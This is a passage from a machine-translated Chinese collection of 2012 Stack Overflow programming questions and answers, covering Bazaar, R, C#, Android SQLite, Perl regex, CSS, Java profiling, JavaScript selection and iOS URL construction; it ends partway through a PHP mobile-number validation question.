CommonLibrary
ProjectA (uses CommonLibrary)
ProjectB (uses CommonLibrary) 
```

但是，我希望能够存储一些项目级文件（并对其进行版本化），因为我在 Visual Studio 中工作（它需要包含所有项目信息的解决方案文件）。

在几乎所有情况下，我都希望两个项目共享同一个公共库。

此外，目前我将它们全部控制在 1 个分支下 - 但是当我选择上述任何解决方案时，我需要拆分它们，但我不知道如何（我想保留所有历史记录）。

实现这一目标的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T23:10:46.990

为了拆分您的分支，请查看 bazaar`split`命令。它执行以下操作： 将树的子目录拆分为单独的树。

我也主要使用 bzr-externals 因为它使用内置命令。

# r - 如何操纵“动物园”对象进行预测？

> ID：11786363
> 
> 赞同：3
> 
> 时间：2012-08-02T21:53:14.127
> 
> 标签：r, zoo

我有销售的每日数据。周六和周日有更高的销售额是有规律的。最初我使用 tseries 库并尝试使用 auto.arima 创建预测。后来我读到最好将动物园对象用于日常数据。我这样做了。[我还按照此链接https://stat.ethz.ch/pipermail/r-help/2011-February/269069.html](https://stat.ethz.ch/pipermail/r-help/2011-February/269069.html)中的 Gabor 步骤进行操作，并于 2 月 29 日摆脱了困境。

我的问题是如何操纵动物园对象并创建预测？我可以应用“预测”包中的特定模型，还是必须在“动物园”对象上分别检查自动相关、趋势、季节性。我见过一些人将 zoo 转换为 ts 或 xts。当我将它转换为 ts 时，我会丢失我的时间索引，即日期。我很抱歉没有提供我的数据集，但我之前断电了，我只能从 Rapp.history 中看到我的命令。任何的意见都将会有帮助。

谢谢

# c# - 如何验证两个输出参数不指向同一个地址？

> ID：11786364
> 
> 赞同：1
> 
> 时间：2012-08-02T21:53:15.113
> 
> 标签：c#

我创建了一个带 2 个输出参数的方法。我注意到调用代码可以为两个参数传入相同的变量，但是这种方法要求这些参数是分开的。我想出了我认为是验证这是真的最好的方法，但我不确定它是否能 100% 工作。这是我想出的代码，其中嵌入了问题。

```
private static void callTwoOuts()
{
    int same = 0;
    twoOuts(out same, out same);

    Console.WriteLine(same); // "2"
}

private static void twoOuts(out int one, out int two)
{
    unsafe
    {
        // Is the following line guaranteed atomic so that it will always work?
        // Or could the GC move 'same' to a different address between statements?
        fixed (int* oneAddr = &one, twoAddr = &two)
        {
            if (oneAddr == twoAddr)
            {
                throw new ArgumentException("one and two must be seperate variables!");
            }
        }

        // Does this help?
        GC.KeepAlive(one);
        GC.KeepAlive(two);
    }

    one = 1;
    two = 2;
    // Assume more complicated code the requires one/two be seperate
} 
```

我知道解决这个问题的一种更简单的方法就是使用方法局部变量，最后只复制到 out 参数，但我很好奇是否有一种简单的方法来验证地址，这样就不需要这样做了.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T22:02:43.187

我不确定你为什么想知道它，但这里有一个可能的黑客：

```
private static void AreSameParameter(out int one, out int two)
{
    one = 1;
    two = 1;
    one = 2;
    if (two == 2)
        Console.WriteLine("Same");
    else
        Console.WriteLine("Different");
}

static void Main(string[] args)
{
    int a;
    int b;
    AreSameParameter(out a, out a); // Same
    AreSameParameter(out a, out b); // Different
    Console.ReadLine();
} 
```

最初我必须将两个变量都设置为任何值。然后将一个变量设置为不同的值：如果另一个变量也发生了变化，那么它们都指向同一个变量。

# android - Android Cursor.getColumnIndex 返回 -1

> ID：11786367
> 
> 赞同：0
> 
> 时间：2012-08-02T21:53:39.197
> 
> 标签：android, sqlite, cursor

我创建了一个 SQLiteOpenHelper 子类来存储提醒。我在这个类中创建了一个表，如下所示：

```
public static final String TABLE = "Reminders";
public static final String ID = "id";
public static final String COMPLETE = "complete";
public static final String PRIORITY = "priority";
public static final String DATE = " alarmdate";
public static final String TITLE = "title";
public static final String NOTES = "notes";

@Override
public void onCreate(SQLiteDatabase db) {
    String create = "CREATE TABLE " + TABLE + "(\n" 
            + ID + " INTEGER PRIMARY KEY, \n" 
            + COMPLETE + " INTEGER DEFAULT 0, \n" 
            + PRIORITY + " INTEGER DEFAULT 1, \n"
            + DATE + " CHAR(21) DEFAULT NULL, \n"
            + TITLE + " TEXT NOT NULL, \n" 
            + NOTES + " TEXT DEFAULT NULL \n"
            + ");";
    db.execSQL(create);
} 
```

数据库创建得很好，我可以正常添加条目。

问题是，当我想从数据库中检索一行时，cursor.getColumnIndex(DATE) 返回 -1，而它为其他字段返回正确的索引：

```
//Method of the helper class
public Reminder getReminder(int _id) {
    Reminder r;

    SQLiteDatabase db = getReadableDatabase();
    String query = String
            .format("SELECT * FROM %s WHERE ID=%d", TABLE, _id);
    Cursor cursor = db.rawQuery(query, null);

    cursor.moveToFirst();

    if (cursor.isAfterLast())
        return null;

    boolean complete = (cursor.getInt(cursor.getColumnIndex(COMPLETE)) != 0);
    int priority = cursor.getInt(cursor.getColumnIndex(PRIORITY));
    String dateS = cursor.getString(cursor.getColumnIndex(DATE)); //cursor.getColumnIndex(DATE) returns -1;

    //etc...
    cursor.close(); 
```

这很烦人，因为 getColumnIndex() 返回所有其他字段的有效索引。

更重要的是，调用`cursor.getString(3)`而不是`cursor.getString(cursor.getColumnIndex(DATE))`，我正确地获得了日期值。

这可能是什么原因，我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T21:57:44.217

尝试从`" alarmdate"`.

如果这样做不行，请尝试更改`CHAR(21)`为`TEXT`，这意味着就 SQLite 而言完全相同。

# regex - Perl 多行正则表达式匹配如何与 Unicode 字符属性交互？

> ID：11786369
> 
> 赞同：3
> 
> 时间：2012-08-02T21:53:42.203
> 
> 标签：regex, perl, unicode

我正在处理一个多行字符串，带有 Unix (\n) 换行符。

它的一些行具有“A，a”的形式（即大写字母、逗号、空格、小写字母），我想从字符串中删除这些。

我可以通过正则表达式替换来完成此操作，但有一个我不明白的谜团：

使用“[AZ]”和“[az]”的正则表达式可以在普通模式和多行模式下工作。

使用 "\p{Lu}" 和 "\p{Ll}" 的正则表达式有效，但仅适用于普通模式，而不适用于多行模式。

这些成功中的每一个：

```
$all =~ s/\n\K *[A-Z], [a-z]\n//g;    # 1

$all =~ s/^ *[A-Z], [a-z]\n//mg;      # 2

$all =~ s/\n\K *\p{Lu}, \p{Ll}\n//g;  # 3 
```

但这失败了：

```
$all =~ s/^ *\p{Lu}, \p{Ll}\n//mg;    # 4 
```

我希望 /m 开关改变正则表达式中“^”的含义，但没有别的。所以，我希望语句 4 能够正常工作，就像语句 1、2 和 3 一样。语句 2 似乎表明多行语法是可以的，而语句 3 似乎表明 Unicode 字符属性符合预期，所以，当我结合这些时，我希望语句 4 能够工作。

我看过汤姆克里斯滕森的回答[为什么现代 Perl 默认避免使用 UTF-8？](https://stackoverflow.com/questions/6162484/why-does-modern-perl-avoid-utf-8-by-default/6163129#6163129)，但我没有看到任何关于多行正则表达式匹配的信息，我也没有在其他地方找到答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:11:48.067

我无法复制您的问题。

```
$ perl -wle'
   $all = "foo\n  A, x\nmeow";
   $all =~ s/^ *[A-Z], [a-z]\n//mg;
   print $all;
'
foo
meow

$ perl -wle'
   $all = "foo\n  A, x\nmeow";
   $all =~ s/^ *\p{Lu}, \p{Ll}\n//mg;
   print $all;
'
foo
meow 
```

在 Linux 上使用 5.8.8、5.10.1、5.12.4（线程）和 5.16.0 进行了测试。

最佳猜测：`pos($all)`不为零。也许你做了一些愚蠢的事情`if ($all =~ /.../g)`。

* * *

我一开始也无法复制空格。

```
$ perl -wle'
   $all = "foo\nA, x\nmeow";
   $all =~ s/^ *[A-Z], [a-z]\n//mg;
   print $all;
'
foo
meow

$ perl -wle'
   $all = "foo\n  A, x\nmeow";
   $all =~ s/^ *\p{Lu}, \p{Ll}\n//mg;
   print $all;
'
foo
meow 
```

在 cygwin 上使用 5.10.1（线程）测试。

```
>perl -wle"$all = qq{foo\nA, x\nmeow}; $all =~ s/^ *[A-Z], [a-z]\n//mg; print $all;"
foo
meow

>perl -wle"$all = qq{foo\nA, x\nmeow}; $all =~ s/^ *\p{Lu}, \p{Ll}\n//mg; print $all;"
foo
meow 
```

在 Windows (ActivePerl) 上使用 5.14.0（线程）和 5.14.2（线程）测试。

但是，啊哈！！！！

```
>perl -wle"$all = qq{foo\nA, x\nmeow}; $all =~ s/^ *[A-Z], [a-z]\n//mg; print $all;"
foo
meow

>perl -wle"$all = qq{foo\nA, x\nmeow}; $all =~ s/^ *\p{Lu}, \p{Ll}\n//mg; print $all;"
foo
A, x
meow 
```

在 Windows (ActivePerl) 上使用 5.10.1（线程）、5.12.1（线程）和 5.12.4（线程）进行了测试。

旧版本的 Perl 似乎有一个错误。它似乎已在 5.14 中修复。该错误似乎在优化器中（如 所示`-Mre=debug`），因此可以通过“禁用”优化器来绕过它。

```
>perl -wle"$all = qq{foo\nA, x\nmeow}; $all =~ s/^ *\p{Lu}, \p{Ll}\n//mg; print $all;"
foo
A, x
meow

>perl -wle"$all = qq{foo\nA, x\nmeow}; $all =~ s/^ *\p{Lu}{1}, \p{Ll}\n//mg; print $all;"
foo
meow 
```

# html - 根据设置的像素边距使用窗口调整图像大小？

> ID：11786373
> 
> 赞同：0
> 
> 时间：2012-08-02T21:54:06.330
> 
> 标签：html, css, image, resize, margins

我试图让图像居中在屏幕上，我希望它水平拉伸。这里的诀窍是我需要设置边距。让我们以 200px 为例。

无论窗口大小如何，图像都需要水平拉伸（并且可能按比例缩放）以保持这些边距。

我可以将它居中，也可以拉伸它，但由于某种原因，我不能同时做到这两点。

此外，这只需要 CSS！没有 JS。

**任何帮助是极大的赞赏！:D**

PS 我见过很多关于用窗口大小缩放图像的问题，这不是一回事。我需要以像素为单位设置保持不变的边距，而它们之间的图像水平拉伸。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:05:46.120

我在图像周围放了一个容器，可以保留边距。随着窗口宽度的变化，边距保持不变 - 只有宽度`.container`发生变化。通过将容器内图像的宽度设置为 100%，整个图像将根据容器的宽度（按比例）缩放：

CSS：

```
.container {
    margin: 0 200px;
    background: red;
}

.container img {
    width: 100%;
} 
```

HTML：

```
<div class="container">
    <img src="http://www.aviationnews.eu/blog/wp-content/uploads/2012/07/Olympic-Rings.png" />
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:02:02.950

您可以使用两个 div，外部设置边距，内部设置宽度为 100%：

[http://jsfiddle.net/tqmrY/4/](http://jsfiddle.net/tqmrY/4/)

```
<div id="holder">
    <div></div>
</div>​

#holder {
    background: #333;
    height: 100px;
    margin: 0 100px;
}
#holder div {
        width: 100%;

}
​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:03:55.647

你可以做到这一点的一种方法是将你的图像放在一个 div 中，然后在 div 上放置填充。

您可以将 img 设置为 100% 的宽度和自动高度，然后在包含的 div 上放置填充。

这是一个例子

[http://jsfiddle.net/uJnmf/](http://jsfiddle.net/uJnmf/)

# c# - 制作用于保存图像的动态路径字符串

> ID：11786382
> 
> 赞同：-1
> 
> 时间：2012-08-02T21:55:10.800
> 
> 标签：c#, dynamic, path, printscreen

第一次在这个论坛上发帖，对编码也很陌生。对不起，如果这是一个简单的问题，但我做错了各种各样的事情。

**我想保存截图的情况** ，我想文件名是当前日期，如：

```
string path = DateTime.Now.ToShortDateString().ToString(); 
```

我正在尝试这个：

```
ScreenCapture s = new ScreenCapture();
s.CaptureWindowToFile(this.Handle,(@"C:\images\" + path + ".png"), ImageFormat.Png); 
```

这是一团糟，而且不起作用。即使您告诉我先了解更多信息，然后从我自己的项目开始，任何帮助都将不胜感激。

**编辑：** 我使用的截屏类：http: [//www.developerfusion.com/code/4630/capture-a-screen-shot/](http://www.developerfusion.com/code/4630/capture-a-screen-shot/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T21:58:28.243

您的时间字符串中可能包含无效字符。采用：

```
DateTime.Now.ToString("ddMMyyHHmmss"); 
```

您可以随意更改顺序。我写的顺序是“日月年时分秒”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:03:02.157

您可以使用下面的示例声明您的变量

```
var path = DateTime.Now.ToString("ddMMyyHHmmss"); 
```

或者

```
 string path = DateTime.Now.ToString("ddMMyyHHmmss"); 
```

# c# - 用于插入记录的 Web API

> ID：11786387
> 
> 赞同：0
> 
> 时间：2012-08-02T21:55:40.740
> 
> 标签：c#, vb.net, asp.net-web-api

我正在研究 Taleo Web API。我有一个包含几条记录的 XML 文件，我必须使用它的 Web API 将这些记录插入到 Taleo 系统中。

我从[http://tbe.taleo.net/products/TBE_API_Guide.pdf](http://tbe.taleo.net/products/TBE_API_Guide.pdf)获得了 Taleo API 指南。

第一次，我正在研究 Web API，所以我不知道从哪里开始。尽管该指南显示了一些使用 SOAP 的示例，但我不知道如何使用 C# 或 VB.NET 发出此请求并检索响应。我用谷歌搜索了它，但没有得到太多关于它的信息。如果您分享您的想法，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T03:05:39.200

从 PDF 中可以看出，该服务的 WSDL 位于：[http](http://tbe.taleo.net/wsdl/WebAPI.wsdl) ://tbe.taleo.net/wsdl/WebAPI.wsdl 。在您的 C#/VB 项目中，使用上下文菜单上的“添加服务引用”选项并将该 URI 提供给 WSDL。这将生成一个代理和许多辅助类，您可以在这些类上调用您需要的任何方法 - SOAP 详细信息在幕后。您将实例化 WebAPIClient 的一个实例，并且应该在那里看到所有相关的方法。

例如，在 C# 中，使用 ServiceReference2 的（未受启发的）命名空间名称创建新的服务引用后，我可以编写以下代码（尽管我不知道它的作用！）：

```
 var x = new ServiceReference2.WebAPIClient();  // I suspect there's an overload expecting credentials
        ServiceReference2.AccountBean y = x.getAccountById("bar", 0); 
```

异常处理留给读者:)

# crystal-reports - 有时我得到数据库登录失败，有时我没有

> ID：11786391
> 
> 赞同：1
> 
> 时间：2012-08-02T21:55:58.723
> 
> 标签：crystal-reports

使用水晶报表 VS2010。这个问题出现在由 arvixe 提供的生产托管中。有时，当我生成报告时，我会收到 Database Logon Failed asp.net 错误。有时它工作得很好。我能做些什么来解决这个问题，让它在 100% 的时间里都能正常工作？我实际上并没有在这里连接到数据库。只使用 ASP.NET 对象。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T16:03:45.843

对于不容易重现的间歇性错误，全面的日志记录（在代码中的多个位置）是一种标准解决方案，可以帮助您隔离原因。

# dotnetnuke - 如何实现或开发自己的 Twitter 身份验证提供程序？

> ID：11786392
> 
> 赞同：0
> 
> 时间：2012-08-02T21:56:04.257
> 
> 标签：dotnetnuke

我想允许我的用户使用他们的 Twitter 帐户登录。

我需要什么来实现这个？我想知道 DNN 进行用户身份验证所遵循的所有流程。

我正在使用 DotNetNuke 6.2、Visual Studio 2008、SqlServer 2008

欢迎任何答案，包括了解它的页面链接、在线教程等。请原谅我的英语，但我会说西班牙语！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T06:56:44.230

了解如何创建新身份验证提供程序的最佳地点是查看现有身份验证提供程序。您可以从 dotnetnuke.codeplex.com 下载源代码。

[这是来自 Joe Brinkman 的帖子的链接，](http://www.theaccidentalgeek.com/post/2009/07/13/DotNetNuke-Tips-and-Tricks-12-Creating-your-own-Authentication-Provider.aspx)该帖子已有 2-3 年的历史，但仍然很有用，因为在实施身份验证提供程序方面没有发生太大变化。

如果您需要更多帮助，请告诉我。

# java - 如何跟踪 Java 中的内存泄漏？

> ID：11786399
> 
> 赞同：1
> 
> 时间：2012-08-02T21:56:37.033
> 
> 标签：java, debugging, memory-leaks

日志显示，我的代码将在几个小时内关闭

```
java.lang.OutOfMemoryError: GC overhead limit exceeded
        at java.io.FileDescriptor.<init>(FileDescriptor.java:62)
        at sun.nio.ch.ServerSocketChannelImpl.accept(ServerSocketChannelImpl.java:217)
        at org.jboss.netty.channel.socket.nio.NioServerSocketPipelineSink$Boss.run(NioServerSocketPipelineSink.java:235)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722) 
```

如何跟踪这样的问题？有什么工具可以帮忙吗？堆栈没有指向我代码中的任何行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T21:58:29.167

堆转储是需要分析的，以找出内存泄漏的根本原因。

有[jhat](http://docs.oracle.com/javase/6/docs/technotes/tools/share/jhat.html)和 jprofiler 等工具，将用于分析堆转储。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T21:58:43.997

有很多工具可以监控 Java 应用程序的 cpu 和内存使用情况。例如，在 JDK 1.6 中，您可以找到`jvisualvm`分析工具。还有 Sun Profiling Studio，其中包含`collect`可与`-j`选项一起使用的命令（有关详细信息，请参阅文档）。

**PS** `collect`命令提供了很多乐趣——它可以显示实际执行的汇编代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T04:51:45.107

你有很多选择来解决你的麻烦。这里有免费的监控工具，看这个

*   [JRat](http://jrat.sourceforge.net/)
*   [美洲狮](http://profiler.cougaar.org/)
*   [Java 应用程序监视器 (JAMon)](http://www.jamonapi.com)
*   [红外线的](http://infrared.sourceforge.net/versions/latest/)
*   jconsole（已经包含在 JVM 中）
*   jvisualvm（已经包含在 JVM 版本 1.6 x 中）

# javascript - 使用 DIV 作为按钮时保持文本选择

> ID：11786401
> 
> 赞同：3
> 
> 时间：2012-08-02T21:56:47.203
> 
> 标签：javascript, jquery, selection, textselection

也许这是与浏览器相关的问题？我现在在 Chrome 上...

我想要完成的是允许用户使用光标保存他们在页面上选择（突出显示）的文本。

我已经完成了 javascript/jQuery/ajax 的所有设置......当我通过控制台对其进行测试时，它就像一个魅力。

ie - 我选择一些文本然后运行这个命令。

```
alert(getSelected()); 
```

我会收到一个带有所选字符的警报弹出窗口。...所以它在理论上有效。

但是 - 当我想使用按钮拨打电话时，发生的事情是文本选择首先消失，因此我无法查看/保存他们选择的内容。

```
<script>
$('#save').click(function(){
  var selected_text = getSelected();
});
</script>

<div id="save"><img src="the_save_button.jpg" height="50" width="50" /></div> 
```

有没有办法在单击/单击“保存”DIV 后保持文本选择？

对任何和所有解决方案都开放！！谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T23:14:25.913

一种简单的选择是使用`mousedown`而不是`click`. 但是，这与按钮的原生行为不同，后者是在释放鼠标按钮时触发一个动作，所以 UI 不是很好。

另一种选择是使用专有的 CSS 属性和`unselectable`IE 和 Opera 的属性组合使可点击元素不可选择，这样可以防止点击清除选择：

演示：http: [//jsfiddle.net/timdown/UUQJs/](http://jsfiddle.net/timdown/UUQJs/)

CSS：

```
.unselectable {
    -khtml-user-select: none;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
} 
```

HTML：

```
<div id="save" unselectable="on" class="unselectable"><img
   src="the_save_button.jpg" height="50" width="50" unselectable="on" /></div> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:03:35.323

尝试以下操作：

```
$('#save').click(function(){
   var selected_text = "";
   if (window.getSelection) {
        selected_text = window.getSelection();
   } else if (document.getSelection) {
        selected_text = document.getSelection();
   } else if (document.selection) {
        selected_text = document.selection.createRange().text; 
   }
   alert(selected_text)
}); 
```

[演示](http://jsfiddle.net/uUqwZ/)

或者：

```
$('#save').mousedown(function(){
   // ...
}); 
```

[演示](http://jsfiddle.net/uUqwZ/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:04:09.827

当用户选择文本时，将其存储在全局变量中。确保在他们取消选择时不要删除它；该变量应保存用户选择的最后一个文本。然后按钮可以引用此文本。你也可以使用这样的东西：

```
$('html').click(function() {
    global_var = '';
});
$('the button').click(function(event) {
    event.stopPropagation();
}); 
```

允许删除文本，除非用户单击按钮。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T22:22:04.917

一旦做出选择，您应该将它分配给一个变量并保存它，然后只使用按钮单击事件进行 ajax 查询。这里涉及的问题是，一旦单击事件启动，您就会再次取消选择它（一旦单击鼠标，您会注意到蓝色背景选择部分消失了），因此它什么也不返回。

# c# - 正则表达式如何检查单词边界条件unicode

> ID：11786402
> 
> 赞同：0
> 
> 时间：2012-08-02T21:56:56.373
> 
> 标签：c#, regex

我正在尝试检查给定单词（例如*matchword*）是否在来自外部来源的句子中。目前在 C# 中，我计划使用下面的正则表达式模式来覆盖这些单词边界场景（*匹配*词应该是一个可以与所有可能的句子或断词字符分隔的单词）。matchword 可以在句子的开头/中间/结尾，有时也可以是字符串的完全匹配。

应涵盖多语言文本，且不区分大小写。

```
([\s+,"'\(\[])matchword([\s+;\?\.;,"'\)\]]) 
```

一个例子，

假设我的匹配词是“测试”（不带引号）

和例句是：

这是测试，字符串——结果——真

这是测试——结果——错误

这是testest——结果——假

测试——结果——真

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:39:40.970

我想在您的情况下，消极的环顾可能就足够了：

```
(?<!\w)test(?!\w) 
```

这意味着：单词 test 之前或之后没有 \w 字符。

如果要在 C# 中使表达式不区分大小写，则必须使用`RegexOptions.IgnoreCase`以下示例中的标志：

```
Regex.IsMatch(subjectString, @"(?<!\w)test(?!\w)", RegexOptions.IgnoreCase) 
```

[这里](http://www.regular-expressions.info/lookaround.html)更好地解释了环视的全部内容。无论如何，在您的情况下，上述涉及的答案`\b`要好得多。只需将此概念视为您可能想要更深入地了解以更好地掌握正则表达式的东西。它的强大之处在于能够选择更复杂的表达式以包含在前瞻或后视组中。在你的情况下，这只是一种浪费。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T22:43:18.107

尝试`\btest\b`其中**\b**表示单词的开头和结尾，或者您可以`(?i)\btest\b`使其不区分大小写

# php - 如何使用 zend 压缩我的 php 脚本？

> ID：11786403
> 
> 赞同：-1
> 
> 时间：2012-08-02T21:57:09.560
> 
> 标签：php, apache, zend-framework

好吧，我有一个关于 zend compress 的问题，我可以压缩一个 php 脚本然后将其上传到客户端服务器，但没有 1 可以访问它，只有获得一些密钥或类似的东西。

有没有办法用zend或任何方法做到这一点？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:59:09.680

我认为您正在寻找[Zend Guard](http://www.zend.com/en/products/guard/)

# android - 移动设备的块密码或流密码？

> ID：11786404
> 
> 赞同：1
> 
> 时间：2012-08-02T21:57:11.670
> 
> 标签：android, encryption

我想知道，为什么在Android中实现块密码而不是实现流密码更好？

# ios - 使用带有 NSString stringWithFormat 的 url 字符串的最佳做法是什么

> ID：11786405
> 
> 赞同：2
> 
> 时间：2012-08-02T21:57:14.223
> 
> 标签：ios, nsstring, nsurl

我使用`NSString stringWithFormat`方法来创建一个 URL 字符串。但是现在我在“快速”编辑这个字符串时遇到了问题。

例如，我在服务器上有一个脚本，它处理一些带有参数的请求。

我有一个这样的 URL 字符串：

```
http://www.domain.com/api/?param1=%@&param2=%@&param3=%@&param4=%@&param5=%@& 
```

但是当我有超过 5、6 个参数时，真的很难修改这个字符串。

任何人都知道如何创建 URL 字符串的最佳方法（我的意思是当我们修改它时）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T22:15:50.330

这是如何以安全方式添加参数的示例。长而可靠。

```
NSString* const kBaseURL = @"http://maps.google.com/maps/api/geocode/xml";
NSMutableDictionary *parameterDic = [NSMutableDictionary dictionary];
[parameterDic setObject:@"plaza de la puerta del sol 1, madrid, spain" forKey:@"address"];
[parameterDic setObject:@"false" forKey:@"sensor"];

NSMutableArray *parameters = [NSMutableArray array];
for (__strong NSString *name in parameterDic) {
    NSString *value = [parameterDic objectForKey:name];
    name = encodeToPercentEscapeString(name);
    value = encodeToPercentEscapeString(value);
    NSString *queryComponent = [NSString stringWithFormat:@"%@=%@", name, value];
    [parameters addObject:queryComponent];
}
NSString *query = [parameters componentsJoinedByString:@"&"];
NSString *urlString = [NSString stringWithFormat:@"%@?%@", kBaseURL, query];
NSURL *url = [NSURL URLWithString:urlString];
NSLog(@"%@",url); 
```

上面的代码调用了这个 C 函数，因为 stringByAddingPercentEscapesUsingEncoding 不会转换参数名称或值中的某些特殊字符。正如 Jesse Rusak 所指出的，请参阅[Proper URL (Percent) Encoding in iOS](http://cybersam.com/ios-dev/proper-url-percent-encoding-in-ios)进行讨论。

```
// remove CFBridgingRelease and __bridge if your code is not ARC
NSString* encodeToPercentEscapeString(NSString *string) {
    return (NSString *)
        CFBridgingRelease(CFURLCreateStringByAddingPercentEscapes(NULL,
                                            (__bridge CFStringRef) string,
                                            NULL,
                                            (CFStringRef) @"!*'();:@&=+$,/?%#[]",
                                            kCFStringEncodingUTF8));
} 
```

这打印

```
http://maps.google.com/maps/api/geocode/xml?sensor=false&address=plaza%20de%20la%20puerta%20del%20sol%201,%20madrid,%20spain 
```

奖励曲目：如何解构和重建字符串：

```
NSString *stringUrl = @"http://www.google.com:80/a/b/c;params?m=n&o=p#fragment";
NSURL *url = [NSURL URLWithString:stringUrl];
NSLog(@"%@",stringUrl);
NSLog(@"         scheme: %@",[url scheme]);
NSLog(@"           host: %@",[url host]);
NSLog(@"           port: %@",[url port]);
NSLog(@"           path: %@",[url path]);
NSLog(@"   relativePath: %@",[url relativePath]);
NSLog(@"parameterString: %@",[url parameterString]);
NSLog(@"          query: %@",[url query]);
NSLog(@"       fragment: %@",[url fragment]);

NSMutableString *s = [NSMutableString string];
[s appendFormat:@"%@://%@",[url scheme],[url host]];
if ([url port]!=nil){
    [s appendFormat:@":%@",[url port]];
}
[s appendFormat:@"%@",[url path]];
if ([url parameterString]!=nil){
    [s appendFormat:@";%@",[url parameterString]];
}
if ([url query]!=nil){
    [s appendFormat:@"?%@",[url query]];
}
if ([url fragment]!=nil){
    [s appendFormat:@"#%@",[url fragment]];
}
NSLog(@"%@",s); 
```

这打印

```
http://www.google.com:80/a/b/c;params?m=n&o=p#fragment
         scheme: http
           host: www.google.com
           port: 80
           path: /a/b/c
   relativePath: /a/b/c
parameterString: params
          query: m=n&o=p
       fragment: fragment 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T22:48:42.693

我专门为你写了这个，很简单：

```
+ (NSString*) URlStringForBaseURL:(NSString*)baseURL withParams:(NSDictionary*)paramsdictonary{
NSString* url = [baseURL stringByAppendingString:@"?"];
NSUInteger index = 0;
for (NSString* key in [paramsdictonary allKeys]) {
    index++;
    if (index == [paramsdictonary count]) 
        url =  [url stringByAppendingFormat:@"%@=%@",key,[paramsdictonary valueForKey:key]];
    else
        url =  [url stringByAppendingFormat:@"%@=%@&",key,[paramsdictonary valueForKey:key]];
}
return url;
} 
```

您可以使用它（当然，URL 参数的顺序无关紧要）：

```
NSMutableDictionary* params = [NSMutableDictionary dictionary];
[params setValue:@"value1" forKey:@"param1"];
[params setValue:@"value2" forKey:@"param2"];
[params setValue:@"value3" forKey:@"param3"];

NSString* urlStr = [HTMLTextFormat URlStringForBaseURL:@"http://www.domain.com/api/" withParams:params];

NSLog(@"url_: %@",urlStr); 
```

# android - Dreamweaver CS 5.5 Android 错误 - com.phonegap 包不存在

> ID：11786407
> 
> 赞同：1
> 
> 时间：2012-08-02T21:57:15.913
> 
> 标签：android, cordova, dreamweaver

我正在使用 Dreamweaver CS 5.5 将我的 HTML 代码转换为 Android APK。它在过去有效，但突然间，即使对于我创建的新网站，我也会收到以下弹出消息：

> “yourapp”的构建未能成功完成。请查阅位于 C:\Users\MyUserFolder\Desktop\com.company.yourapp_Android\buildlog.log 的构建日志以获取更多详细信息。

该`buildlog.log`文件显示我遇到了六个与缺少包和符号有关的编译错误：

```
DefaultActivity.java:6: package com.phonegap does not exist.
    import com.phonegap.*;
    ^

DefaultActivity.java:8: cannot find symbol
symbol: class DroidGap
    public class DefaultActivity extends DroidGap
                                         ^
...
cannot find symbol --> variable super (3 times)
...
method does not override or implement a method from a supertype
    @Override
    ^ 
```

我的 Android SDK 路径仍然指向`C:\Program Files (x86)\Android\android-sdk`. `Configure Application Framework`我检查了该位置的 SDK 文件夹和基础文件。它似乎仍然存在并且完好无损。

我检查了我的 Adob​​e > Dreamweaver 文件夹，发现它`phonegap.jar`仍然存在。我什至按照另一篇关于如何使用最新的 phonegap 更新 Dreamweaver 的说明进行操作，但我仍然收到错误消息。（这是关于如何更新的帖子：[Dreamweaver CS5.5 中的Phonegap](https://stackoverflow.com/questions/8643581/phonegap-in-dreamweaver-cs5-5?rq=1)）

自从我上次尝试并成功以来已经过去了大约一个月或更长时间，因此任何相关软件或操作系统对我的工作机器的任何更新都可能会破坏它。关于如何解决它的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T16:23:10.083

是的！我想到了！jar 文件结构现在不同了……取决于 libs 目录中包含的 phonegap 的版本。仔细检查该 jar 文件（在诸如 winzip 之类的存档应用程序中，或将其解压缩或在 Java IDE 中查看）。相应地修改代码。完毕。

# php - 以php形式验证手机号码

> ID：11786411
> 
> 赞同：5
> 
> 时间：2012-08-02T21:57:50.430
> 
> 标签：php, mysql, forms, mobile

我想验证 10 位数的手机号码，并在进入数据库时​​添加前缀 0。

```
<?php

include ('database_connection.php');

$citystate = $_POST['citystate'];
$serviceprovider = $_POST['serviceprovider'];
$accept = $_POST['accept'];
if (isset($_POST['formsubmitted'])) {
    $error = array(); //Declare An Array to store any error message 

    if (isset($_POST['checkbox'])) {
        $mumbai = (in_array("mumbai", $_POST['checkbox']) ? 1 : 0);
        $pune = (in_array("pune", $_POST['checkbox']) ? 1 : 0);
        $banglore = (in_array("banglore", $_POST['checkbox']) ? 1 : 0);
